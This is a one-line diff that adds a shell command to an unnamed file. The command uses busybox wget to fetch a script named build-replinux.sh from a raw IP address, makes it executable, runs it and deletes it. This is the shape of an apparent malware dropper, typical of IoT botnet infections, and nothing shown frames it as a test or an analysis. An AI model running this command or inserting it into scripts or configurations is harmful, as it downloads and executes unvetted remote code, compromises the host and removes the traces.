@@ -1,0 +1,1 @@
+busybox wget http://192.166.218.58/build-replinux.sh && chmod +x build-replinux.sh && ./build-replinux.sh && rm build-replinux.sh
